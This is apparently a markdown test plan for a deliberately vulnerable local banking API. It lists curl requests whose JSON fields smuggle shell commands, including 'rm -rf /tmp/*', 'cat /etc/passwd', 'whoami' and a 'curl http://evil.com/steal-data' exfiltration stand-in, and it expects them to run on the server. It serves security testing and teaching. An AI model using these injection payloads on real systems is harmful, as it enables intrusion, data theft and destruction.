# Test Command Injection API Endpoints

## Test 1: Partner Transaction API with Command Injection

### Safe Request (Normal Use Case)
```bash
curl -X POST http://localhost:3000/api/partners/transactions \
  -H "Content-Type: application/json" \
  -d '{
    "partner_bank_code": "BANK001",
    "batch_id": "BATCH123",
    "transactions": [
      {
        "amount": 100.50,
        "currency": "USD",
        "company_name": "Acme Corp",
        "reference": "REF001",
        "description": "Payment for services"
      }
    ]
  }'
```

### Vulnerable Request 1: Command Injection via company_name
```bash
curl -X POST http://localhost:3000/api/partners/transactions \
  -H "Content-Type: application/json" \
  -d '{
    "partner_bank_code": "BANK001",
    "batch_id": "BATCH123",
    "transactions": [
      {
        "amount": 100.50,
        "currency": "USD",
        "company_name": "Evil Corp; echo 'HACKED' > /tmp/pwned.txt; echo",
        "reference": "REF001",
        "description": "Payment for services"
      }
    ]
  }'
```

### Vulnerable Request 2: Command Injection via description
```bash
curl -X POST http://localhost:3000/api/partners/transactions \
  -H "Content-Type: application/json" \
  -d '{
    "partner_bank_code": "BANK001",
    "batch_id": "BATCH123",
    "transactions": [
      {
        "amount": 6000.00,
        "currency": "USD", 
        "company_name": "Large Corp",
        "reference": "REF002",
        "description": "Large payment; curl http://evil.com/steal-data; echo"
      }
    ]
  }'
```

### Vulnerable Request 3: Command Injection via batch_id
```bash
curl -X POST http://localhost:3000/api/partners/transactions \
  -H "Content-Type: application/json" \
  -d '{
    "partner_bank_code": "BANK001",
    "batch_id": "BATCH123; rm -rf /tmp/*; echo vulnerable",
    "transactions": [
      {
        "amount": 100.50,
        "currency": "USD",
        "company_name": "Test Corp",
        "reference": "REF003",
        "description": "Test payment"
      }
    ]
  }'
```

## Test 2: Legacy Integration API

### Vulnerable Request: Command Injection via partner_id
```bash
curl -X POST http://localhost:3000/api/legacy/integration \
  -H "Content-Type: application/json" \
  -d '{
    "partner_id": "LEGACY01; whoami > /tmp/user.txt; echo",
    "xml_data": "<transaction><amount>100</amount></transaction>",
    "notification_url": "http://localhost/notify"
  }'
```

### Vulnerable Request: Command Injection via notification_url
```bash
curl -X POST http://localhost:3000/api/legacy/integration \
  -H "Content-Type: application/json" \
  -d '{
    "partner_id": "LEGACY01",
    "xml_data": "<transaction><amount>100</amount></transaction>",
    "notification_url": "http://evil.com; cat /etc/passwd; echo"
  }'
```

## Expected Behavior

All vulnerable requests should:
1. Return HTTP 200 with success response
2. Execute the injected commands on the server
3. Log the executed commands in the console output
4. Demonstrate how input validation failures can lead to command injection

## Monitoring Command Execution

Watch the Node.js application console output to see the executed commands. You should see log messages like:
- "Log command executed (may have failed): ..."
- "Notification command executed (may have failed): ..."
- "Summary command executed (may have failed): ..."